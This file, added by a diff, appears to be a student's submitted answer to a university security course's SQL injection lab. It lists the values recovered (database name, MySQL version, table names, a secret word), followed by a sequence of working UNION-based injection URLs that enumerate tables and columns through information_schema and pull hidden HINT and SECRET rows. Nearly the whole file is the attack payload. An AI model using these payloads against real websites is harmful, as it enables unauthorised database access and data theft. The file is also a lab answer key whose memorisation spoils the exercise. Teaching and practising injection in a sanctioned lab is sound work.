@@ -1,0 +1,17 @@
+proj2_inject3
+5.5.60-0ubuntu0.14.04.1
+HINT, SECRET, foo, inject3_users
+clavicle
+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=-1%27+union+select+1%2C+database%28%29%2C+3%2C+version%28%29+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=-1%27+union+select+1%2C+1%2C+1%2C+table_name+from+information_schema.tables+where+table_schema%3D%27proj2_inject3%27+limit+0%2C+1+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=-1%27+union+select+1%2C+1%2C+1%2C+table_name+from+information_schema.tables+where+table_schema%3D%27proj2_inject3%27+limit+1%2C+1+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=-1%27+union+select+1%2C+1%2C+1%2C+table_name+from+information_schema.tables+where+table_schema%3D%27proj2_inject3%27+limit+2%2C+1+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=-1%27+union+select+1%2C+1%2C+1%2C+table_name+from+information_schema.tables+where+table_schema%3D%27proj2_inject3%27+limit+3%2C+1+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=-1%27+union+select+1%2C+1%2C+1%2C+column_name+from+information_schema.columns+where+table_name%3D%27HINT%27+limit+0%2C1+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=-1%27+union+select+1%2C+1%2C+1%2C+column_name+from+information_schema.columns+where+table_name%3D%27HINT%27+limit+1%2C1+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=-1%27+union+select+1%2C+1%2C+1%2C+message+from+HINT+limit+0%2C1+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=-1%27+union+select+1%2C+1%2C+1%2C+column_name+from+information_schema.columns+where+table_name%3D%27SECRET%27+limit+0%2C1+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=-1%27+union+select+1%2C+1%2C+1%2C+column_name+from+information_schema.columns+where+table_name%3D%27SECRET%27+limit+1%2C1+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=-1%27+union+select+1%2C+1%2C+1%2C+column_name+from+information_schema.columns+where+table_name%3D%27SECRET%27+limit+2%2C1+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=-1%27+union+select+1%2C+1%2C+1%2C+secret+from+SECRET+where+hash%3D%276425f8cb0c4b0df9f5f0ead6d4d2051a%27+--+
